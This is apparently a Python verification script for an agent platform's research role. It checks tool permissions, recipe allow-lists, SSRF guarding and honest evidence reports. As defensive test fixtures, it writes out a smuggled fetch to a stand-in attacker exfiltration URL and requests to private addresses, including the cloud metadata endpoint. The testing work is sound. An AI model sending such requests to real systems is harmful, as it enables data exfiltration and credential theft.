"""The tool-executing role, end to end, through the real worker.

The claim under test is not "dental discovery works". It is:

    Qevik can dispatch a non-coding agent that safely executes a declared tool
    recipe and returns evidence.

## Why the fetch step needs the server

A controlled fixture is necessarily on loopback, and the address guard refuses
loopback — correctly, and that refusal is itself one of the things being tested.
So the guarded fetch cannot be exercised against a local fixture: the two
requirements are mutually exclusive by design, not by accident.

The resolution is to run the public-fetch step against a genuinely public host
from a host whose DNS is honest. On this developer machine the resolver answers
every name with `198.18.0.185`, so that step reports **NOT VERIFIED** rather
than passing or failing — a test that lies in either direction is worse than one
that says it could not look.

Everything else runs anywhere: the tool contract, the refusals, the allow-list,
the memory, and the worker dispatching the role.

    python3 infra/verify_tool_role.py            # here
    ssh <server> ... python3 infra/verify_tool_role.py    # with honest DNS
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "packages" / "kernel"))

from atlas_kernel.fabric import recipes  # noqa: E402
from atlas_kernel.fabric.agents import Registry  # noqa: E402
from atlas_kernel.mission import service, toolrunner  # noqa: E402
from atlas_kernel.mission.models import MissionStatus  # noqa: E402
from atlas_kernel.mission.timeline import Timeline  # noqa: E402
from atlas_kernel.mission.toolrunner import ToolAgent  # noqa: E402
from atlas_kernel.research.net import Resolution, host_of, resolution  # noqa: E402

TENANT = "tenant-tool-role"
RECIPE = "discover-uae-dental"

PASSED: list[str] = []
FAILED: list[str] = []
UNVERIFIED: list[str] = []


def check(name: str, ok: bool, detail: str = "") -> bool:
    (PASSED if ok else FAILED).append(name)
    print(f"{'  ok  ' if ok else '  FAIL'}  {name}{'  — ' + detail if detail else ''}")
    return ok


def unverified(name: str, why: str) -> None:
    UNVERIFIED.append(name)
    print(f"  ????  {name}  — NOT VERIFIED: {why}")


def dns_is_honest() -> bool:
    """Whether this host's resolver answers made-up names.

    One that does makes every address check meaningless, and a guard test run
    on it proves nothing either way.
    """
    return resolution(host_of(
        "https://qevik-verify-nonexistent-host.invalid/")) is Resolution.NO_SUCH_HOST


# ------------------------------------------------- the contract, everywhere

def the_role_may_only_use_what_it_declares() -> None:
    registry = Registry()
    researcher = registry.get("researcher")
    declared = set(researcher.tools)
    check("the research role declares only network research tools",
          declared == {"http-fetch", "dns"}, str(sorted(declared)))

    # The negative half, one per capability the brief names.
    forbidden = {
        "shell": "arbitrary shell",
        "filesystem": "filesystem write",
        "git-worktree": "git",
        "browser": "browser automation",
        "smtp": "email",
        "publish": "publication",
    }
    for tool, what in forbidden.items():
        refused = toolrunner.refusals(
            recipes.Recipe(id="probe", does="probe", agent_id="researcher",
                           capability=recipes.Capability.RESEARCH,
                           steps=(recipes.Step(tool=tool, command=("x",),
                                               proves="p"),)),
            researcher)
        check(f"a research recipe cannot obtain {what}",
              bool(refused) and tool in refused[0], "; ".join(refused)[:70])

    check("...and the refusal says permission comes from the role",
          "comes from the registered role" in " ".join(toolrunner.refusals(
              recipes.Recipe(id="probe", does="p", agent_id="researcher",
                             capability=recipes.Capability.RESEARCH,
                             steps=(recipes.Step(tool="shell", command=("x",),
                                                 proves="p"),)),
              researcher)))


def an_undeclared_tool_is_refused() -> None:
    """A tool nobody declared anywhere. A typo is not permission."""
    with_typo = recipes.Recipe(
        id="typo", does="p", agent_id="researcher",
        capability=recipes.Capability.RESEARCH,
        steps=(recipes.Step(tool="htp-fetch", command=("x",), proves="p"),))
    refused = toolrunner.refusals(with_typo, Registry().get("researcher"))
    check("a tool nobody declared is refused", bool(refused),
          "; ".join(refused)[:70])


def a_url_outside_the_recipe_is_refused() -> None:
    """The rule that makes "a model proposed a recipe" safe."""
    declared = recipes.get(RECIPE)
    allowed = toolrunner.permitted_urls(declared)
    check("the allow-list is exactly what the recipe names",
          allowed == {"https://www.dha.gov.ae/"}, str(sorted(allowed)))

    smuggled = recipes.Recipe(
        id="smuggle", does="p", agent_id="researcher",
        capability=recipes.Capability.RESEARCH,
        steps=(recipes.Step(tool="http-fetch",
                            command=("https://attacker.example/exfil",),
                            proves="p"),))
    # Run it against the *declared* recipe's allow-list, which is what the
    # runner does: the list comes from the recipe being run, so this is the
    # shape where a caller substituted a step.
    step = toolrunner._fetch(smuggled.steps[0], allowed=allowed, client=None,
                             check_addresses=True)
    check("a URL the recipe does not name is refused before a socket opens",
          not step.passed and "not named by this recipe" in step.detail,
          step.detail[:80])
    check("...and no evidence is produced for it", not step.evidence)


def the_guard_is_enforced() -> None:
    from atlas_kernel.opportunity import crawler

    private = ["http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/"]
    evidence, refused = crawler.fetch_steps(private, detector="verify-tool-role")
    check("SSRF protection remains enforced",
          not evidence and len(refused) == len(private),
          f"{len(refused)} refused")
    check("...by the address guard specifically",
          all(crawler.was_refused_by_the_guard(r) for r in refused))


def evidence_is_facts_not_conclusions() -> None:
    """The adapter returns what the server said and nothing about what it means."""
    from atlas_kernel.opportunity.crawler import evidence_from
    from atlas_kernel.research.net import Page

    piece = evidence_from(
        Page(url="https://example.test/", status=200, content_type="text/html",
             bytes=120, elapsed_ms=8),
        detector="verify-tool-role")
    check("evidence carries the URL, status, retrieval facts and a fingerprint",
          piece.source == "https://example.test/"
          and piece.observed["status"] == 200
          and piece.observed_at is not None and bool(piece.fingerprint),
          str(piece.observed)[:70])
    words = (piece.summary + str(piece.observed)).lower()
    check("EVIDENCE CONTAINS NO BUSINESS CONCLUSION",
          not any(claim in words for claim in
                  ("is new", "opportunity", "prospect", "good fit", "should be")),
          piece.summary)


# ---------------------------------------- the vertical slice, through the worker

def the_worker_runs_the_role(tmp: Path, *, honest_dns: bool) -> None:
    declared = recipes.get(RECIPE)
    timeline = Timeline(tmp / "role" / "missions.jsonl")

    mission, event = service.create(
        tenant=TENANT, title="discovery through the research role",
        requested_by="harness", origin_name="none", recipe=RECIPE)
    timeline.append(event)
    mission, event = service.transition(mission, MissionStatus.PLANNING,
                                        tenant=TENANT, actor="harness")
    timeline.append(event)
    mission, event = service.attach_plan(
        mission, ToolAgent(declared).plan("run it"), tenant=TENANT,
        agent_id="researcher", modifies_qevik_itself=False)
    timeline.append(event)
    check("a research mission reaches the queue with nobody asked",
          mission.status is MissionStatus.QUEUED, mission.status.value)

    done = subprocess.run(
        [sys.executable, str(ROOT / "infra" / "mission_worker.py"),
         "--timeline", str(timeline.path), "--tenant", TENANT,
         "--name", "worker-research",
         "--worktrees", str(tmp / "role" / "wt"),
         "--scratch", str(tmp / "role" / "scratch"),
         "--reports", str(tmp / "role" / "reports"),
         "--state", str(tmp / "role" / "state"),
         "--agent", "research", "--once"],
        capture_output=True, text=True, timeout=600, check=False)
    check("THE REAL WORKER DISPATCHES THE RESEARCH ROLE",
          done.returncode == 0 and "research role" in (done.stdout + done.stderr),
          f"exit {done.returncode}")
    asked = "no model is available" in (done.stdout + done.stderr)
    check("...without any model credential", not asked,
          "the worker asked for a provider" if asked else "")

    # Re-read through a new Timeline — the closest one process gets to a restart.
    folded = service.fold(Timeline(timeline.path).read(), tenant=TENANT)
    landed = next((m for m in folded if m["mission_id"] == mission.id), {})

    check("the mission records the recipe it carried out",
          landed.get("recipe") == RECIPE, str(landed.get("recipe")))
    check("the mission records the role identity",
          landed.get("agent_id") == "researcher", str(landed.get("agent_id")))

    report = Path(landed.get("report_path") or "")
    written = (tmp / "role" / "reports" / report) if report.parts else None
    if honest_dns:
        check("the mission completed", landed.get("status") == "complete",
              str(landed.get("status")))
        check("EVIDENCE SURVIVES A RESTART, IN THE DURABLE REPORT",
              bool(written and written.is_file()), str(written))
        if written and written.is_file():
            body = written.read_text()
            check("...naming the recipe, the tools invoked and the fetch",
                  RECIPE in body and "http-fetch" in body and "evidence" in body,
                  body[:70].replace("\n", " "))
    else:
        unverified(
            "the guarded fetch and the completed mission",
            "this resolver answers made-up names, so every address check is "
            "meaningless here. The mission is expected to end blocked or failed "
            f"and did end {landed.get('status')!r}. Run on the server.")
        check("...and it failed honestly rather than inventing evidence",
              landed.get("status") in {"failed", "blocked"},
              str(landed.get("status")))


def a_mission_naming_no_recipe_is_refused(tmp: Path) -> None:
    timeline = Timeline(tmp / "norecipe" / "missions.jsonl")
    mission, event = service.create(
        tenant=TENANT, title="names nothing", requested_by="harness",
        origin_name="none")
    timeline.append(event)
    mission, event = service.transition(mission, MissionStatus.PLANNING,
                                        tenant=TENANT, actor="harness")
    timeline.append(event)
    mission, event = service.attach_plan(
        mission, ToolAgent(recipes.get(RECIPE)).plan("x"), tenant=TENANT,
        agent_id="researcher", modifies_qevik_itself=False)
    timeline.append(event)

    subprocess.run(
        [sys.executable, str(ROOT / "infra" / "mission_worker.py"),
         "--timeline", str(timeline.path), "--tenant", TENANT,
         "--name", "worker-norecipe",
         "--worktrees", str(tmp / "norecipe" / "wt"),
         "--scratch", str(tmp / "norecipe" / "scratch"),
         "--reports", str(tmp / "norecipe" / "reports"),
         "--state", str(tmp / "norecipe" / "state"),
         "--agent", "research", "--once"],
        capture_output=True, text=True, timeout=600, check=False)
    folded = service.fold(Timeline(timeline.path).read(), tenant=TENANT)
    landed = next((m for m in folded if m["mission_id"] == mission.id), {})
    check("a research mission naming no recipe is refused, not defaulted",
          landed.get("status") == MissionStatus.BLOCKED.value,
          str(landed.get("status")))
    check("...and the refusal lists the recipes that exist",
          "discover-uae-dental" in (landed.get("note") or ""),
          (landed.get("note") or "")[:70])


def an_unknown_recipe_is_refused(tmp: Path) -> None:
    timeline = Timeline(tmp / "badrecipe" / "missions.jsonl")
    mission, event = service.create(
        tenant=TENANT, title="names a stranger", requested_by="harness",
        origin_name="none", recipe="scan-everything-everywhere")
    timeline.append(event)
    mission, event = service.transition(mission, MissionStatus.PLANNING,
                                        tenant=TENANT, actor="harness")
    timeline.append(event)
    mission, event = service.attach_plan(
        mission, ToolAgent(recipes.get(RECIPE)).plan("x"), tenant=TENANT,
        agent_id="researcher", modifies_qevik_itself=False)
    timeline.append(event)

    subprocess.run(
        [sys.executable, str(ROOT / "infra" / "mission_worker.py"),
         "--timeline", str(timeline.path), "--tenant", TENANT,
         "--name", "worker-badrecipe",
         "--worktrees", str(tmp / "badrecipe" / "wt"),
         "--scratch", str(tmp / "badrecipe" / "scratch"),
         "--reports", str(tmp / "badrecipe" / "reports"),
         "--state", str(tmp / "badrecipe" / "state"),
         "--agent", "research", "--once"],
        capture_output=True, text=True, timeout=600, check=False)
    folded = service.fold(Timeline(timeline.path).read(), tenant=TENANT)
    landed = next((m for m in folded if m["mission_id"] == mission.id), {})
    check("A RECIPE NOBODY DECLARED IS REFUSED",
          landed.get("status") == MissionStatus.BLOCKED.value,
          str(landed.get("status")))
    check("...even though a whole process would have had to invent it",
          "no recipe named" in (landed.get("note") or ""),
          (landed.get("note") or "")[:60])


def the_whole_chain(tmp: Path, *, honest_dns: bool) -> None:
    """Scheduler -> mission -> role -> recipe -> tool -> evidence -> report.

    Everything above proves a half: the recurrence creates a mission naming a
    recipe, and a mission naming a recipe runs through the worker. This starts
    at the recurrence and ends at the report, so the join is proven too rather
    than inferred from two overlapping tests.
    """
    import importlib.util

    from atlas_kernel.mission import origins, recurrence
    from atlas_kernel.mission.claims import LocalClaims
    spec = importlib.util.spec_from_file_location(
        "mission_worker", ROOT / "infra" / "mission_worker.py")
    worker = importlib.util.module_from_spec(spec)
    sys.modules["mission_worker"] = worker
    spec.loader.exec_module(worker)

    rule = next((r for r in recurrence.RECURRENCES
                 if r.id == "rec-daily-business-discovery"), None)
    if rule is None:
        check("the daily discovery recurrence is declared", False, "absent")
        return

    registry = origins.Registry.build()
    timeline = Timeline(tmp / "chain" / "missions.jsonl")

    # 1. the scheduler's tick, at a moment past the anchor
    made = worker.tick_recurrences(
        timeline, tenant=rule.tenant_id, name="worker-chain",
        claims=LocalClaims(), registry=registry,
        at=rule.anchor)
    check("the recurrence creates its mission through the ordinary tick",
          made >= 1, f"{made} created")

    folded = service.fold(Timeline(timeline.path).read(), tenant=rule.tenant_id)
    discovery = next((m for m in folded
                      if (m.get("occurrence") or "").startswith(rule.id)), None)
    # The recurrence's own recipe, not a name pinned here. Pinning one is how
    # the recurrence went on naming a recipe with no extractor while the suite
    # stayed green.
    check("...naming the recipe and the role",
          bool(discovery) and discovery["recipe"] == rule.recipe
          and discovery["agent_id"] == "researcher",
          f"{discovery.get('recipe')} / {discovery.get('agent_id')}"
          if discovery else "no mission")
    check("...queued with nobody asked",
          bool(discovery) and discovery["status"] == MissionStatus.QUEUED.value,
          discovery["status"] if discovery else "")

    # 2. the real worker, dispatching the research role
    done = subprocess.run(
        [sys.executable, str(ROOT / "infra" / "mission_worker.py"),
         "--timeline", str(timeline.path), "--tenant", rule.tenant_id,
         "--name", "worker-chain",
         "--worktrees", str(tmp / "chain" / "wt"),
         "--scratch", str(tmp / "chain" / "scratch"),
         "--reports", str(tmp / "chain" / "reports"),
         "--state", str(tmp / "chain" / "state"),
         "--agent", "research", "--once"],
        capture_output=True, text=True, timeout=600, check=False)
    check("the worker ran it", done.returncode == 0, f"exit {done.returncode}")

    after = service.fold(Timeline(timeline.path).read(), tenant=rule.tenant_id)
    ran = next((m for m in after
                if m["mission_id"] == (discovery or {}).get("mission_id")), {})

    if not honest_dns:
        unverified("the whole chain completing",
                   "the fetch cannot succeed on a resolver that answers "
                   f"made-up names; the mission ended {ran.get('status')!r}")
        return

    check("THE WHOLE CHAIN COMPLETES: recurrence to report",
          ran.get("status") == MissionStatus.COMPLETE.value,
          str(ran.get("status")))
    report = Path(ran.get("report_path") or "")
    body = ((tmp / "chain" / "reports" / report).read_text()
            if report.parts and (tmp / "chain" / "reports" / report).is_file()
            else "")
    check("...and the report carries the recipe, the tools and the evidence",
          rule.recipe in body and "http-fetch" in body and "evidence " in body,
          body[:60].replace("\n", " ") if body else "no report")
    # The property, not a keyword scan.
    #
    # The scan forbade "is new" — and flagged the report for containing the
    # caveat *"Says nothing about whether the entity is new to anybody else"*,
    # which is the sentence that prevents the overclaim. It also flagged
    # "opportunity detection", a section label.
    #
    # What must actually hold: the report may say a business is new **to
    # Qevik**, and may never say it is new to the world or to a source that did
    # not say so. So novelty and its caveat travel together.
    low = body.lower()
    overclaims = [phrase for phrase in
                  ("new to google", "new to the world", "newly opened",
                   "recently opened", "guaranteed", "definitely")
                  if phrase in low]
    check("...and claims nothing about the world", not overclaims,
          f"the report claimed: {', '.join(overclaims)}" if overclaims else "")
    if "discovered_by_qevik" in low:
        check("...and every novelty state carries its caveat",
              "says nothing about whether" in low,
              "a discovery state appeared without the sentence that bounds it")


def main() -> int:
    honest = dns_is_honest()
    print("tool-executing role — real worker\n")
    verdict = ("honest" if honest else
               "answers made-up names, so address checks are meaningless here")
    print(f"resolver: {verdict}\n")

    print("the tool contract")
    the_role_may_only_use_what_it_declares()
    an_undeclared_tool_is_refused()
    a_url_outside_the_recipe_is_refused()
    the_guard_is_enforced()
    print("\nthe evidence boundary")
    evidence_is_facts_not_conclusions()

    with tempfile.TemporaryDirectory() as raw:
        tmp = Path(raw)
        print("\nthe worker")
        the_worker_runs_the_role(tmp, honest_dns=honest)
        a_mission_naming_no_recipe_is_refused(tmp)
        an_unknown_recipe_is_refused(tmp)
        print("\nthe whole chain")
        the_whole_chain(tmp, honest_dns=honest)

    print(f"\n{len(PASSED)} passed, {len(FAILED)} failed, "
          f"{len(UNVERIFIED)} not verified here")
    return 1 if FAILED else 0


if __name__ == "__main__":
    raise SystemExit(main())
